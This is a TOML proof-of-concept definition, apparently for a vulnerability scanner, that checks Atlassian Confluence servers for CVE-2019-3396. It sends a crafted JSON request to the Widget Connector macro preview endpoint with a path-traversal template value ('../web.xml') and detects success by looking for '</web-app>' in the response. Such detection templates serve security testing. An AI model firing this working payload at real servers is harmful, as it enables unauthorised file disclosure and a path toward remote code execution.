[info]
author = "ave"
description = "通过向Confluence Server的Widget Connector宏REST接口发送特制JSON请求，在_template参数中构造路径穿越载荷，验证服务器端模板注入(SSTI)漏洞是否可被利用以读取任意服务器文件，进而实现远程代码执行。"
id = "POC-AVE-2019-1200"
name = "Atlassian Confluence Widget Connector Macro SSTI PoC"
severity = "critical"
tags = ["ave-2019-1200"]
vuln_id = [
    "CVE-2019-3396",
    "AVE-2019-1200",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/rest/tinymce/1/macro/preview"
protocol = "http"

[poc.requests.body]
content = '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}'
type = "raw"

[poc.requests.headers]
Content-Type = "application/json"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["</web-app>"]
